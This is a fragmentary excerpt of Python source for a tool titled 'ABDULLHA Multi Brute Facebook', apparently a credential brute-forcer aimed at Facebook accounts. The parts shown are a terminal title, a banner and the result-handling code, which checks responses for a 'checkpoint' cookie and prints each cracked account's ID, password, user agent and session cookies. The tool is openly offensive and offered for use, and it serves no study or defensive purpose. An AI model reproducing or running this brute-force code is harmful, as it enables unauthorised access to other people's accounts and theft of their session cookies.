...
sys.stdout.write('\x1b]2; AMBF | ABDULLHA Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
...
def banner():
 ...
 /_/    \_\____/|_____/ \____/|______|______|_|  |_/_/    \_\                                                                                                                                   
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='ABDULLHA-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='ABDULLHA-OK')
					cetak(statusok1)
